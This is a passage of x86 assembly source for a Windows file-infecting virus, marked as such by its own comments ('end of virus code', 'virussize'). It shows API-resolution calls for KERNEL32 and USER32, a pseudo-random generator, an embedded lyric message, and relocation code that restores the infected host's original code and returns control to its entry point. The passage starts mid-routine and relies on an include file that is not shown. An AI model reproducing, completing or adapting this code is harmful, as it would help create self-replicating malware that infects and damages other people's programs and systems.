          lea edx, dword ptr [ebp+getprocaddress]     ;Ýthen let's locate
          call LocateGetProcAddress           ;ÝGetProcAddress
          jc ReturnToHost                 ;Ý
                              ;Ý
          mov ebx, eax                ;Ýnow let's locate all
          mov eax, dword ptr [ebp+k32]        ;Ýthe K32 apis we need
          lea edi, dword ptr [ebp+k32_API_names]      ;Ýfurthure...
          lea esi, dword ptr [ebp+k32_API_addrs]      ;Ý
          call LocateApiAddresses             ;Ý
          jc ReturnToHost                 ;Ý
                              ;Ý
          lea edi, dword ptr [ebp+user32_name]    ;ÝLocate USER32
          call LocateModuleBase               ;Ýmodule base
          jc ReturnToHost                 ;Ý
                              ;Ý
          lea edi, dword ptr [ebp+u32_API_names]      ;Ýand the corresp.
          lea esi, dword ptr [ebp+u32_API_addrs]      ;ÝAPI addresses
          call LocateApiAddresses             ;Ý
          jc ReturnToHost                 ;Ý
                              ;Ý
          jmp FinishedLocatingStuff           ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   Randomize:                     ;Ý
          push eax                    ;Ýinitialize the random
          mov eax, dword ptr [esp]            ;Ýnumber generator
          add dword ptr [ebp+seed], eax           ;Ý
          pop eax                     ;Ý
          ret                     ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   random32:                      ;Ý
          push ecx                    ;Ý
          xor ecx, ecx                ;Ý
          mov eax, dword ptr [ebp+seed]           ;Ý
          mov cx, 33                  ;Ý
                              ;Ý
   rloop:                         ;Ý
          add eax, eax                ;Ý
          jnc $+4                     ;Ý
          xor al, 197                 ;Ý
          loop rloop                  ;Ý
          mov dword ptr [ebp+seed], eax           ;Ý
          pop ecx                     ;Ý
          ret                     ;Ý
   seed dd 0BFF81234h                 ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   brandom32:                     ;Ý
          push edx                    ;Ýthis procedure gets
          push ecx                    ;Ýa random value in eax
          mov edx, 0                  ;Ýbetween 0 and ecx
          push eax                    ;Ý
          call random32                   ;Ý
          pop ecx                     ;Ý
          div ecx                     ;Ý
          xchg eax, edx                   ;Ý
          pop ecx                     ;Ý
          pop edx                     ;Ý
          ret                     ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   db 'The world is full of kings and queens',10,13   ;Ý
   db 'That blind your eyes and steal your dreams'    ;Ý
   db 10,13                       ;Ý
   db 'It''s HEAVEN and HELL!!!',10,13        ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   relocating_code:                   ;Ýthis part will restore
   @7:    mov esi, 12345678h              ;Ýthe original code sec.
   @8:    mov edi, 12345678h              ;Ýand jump to the orig.
          add edi, [ebp+imagebase]            ;ÝEIP.
          add esi, [ebp+imagebase]            ;Ý
          mov ecx, virussize              ;Ý
          rep movsb                   ;Ý
          popa                    ;Ýrestore all regs and
   @9:    mov eax, 12345678h              ;Ý
   @14:   add eax, 12345678h              ;Ý
          push eax                    ;Ý
          nop                     ;Ý
          ret                     ;Ý
   relo_code_size = $-offset relocating_code      ;Ý
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   include get_apis.inc                   ;Ýget apis routines
   end label                      ;Ýend of virus code
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   virussize = end-start                  ;Ývirus size
   incrsize  = virussize + relo_code_size + 100h      ;Ý
   end start                      ;Ý
   end                        ;Ýend of code
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
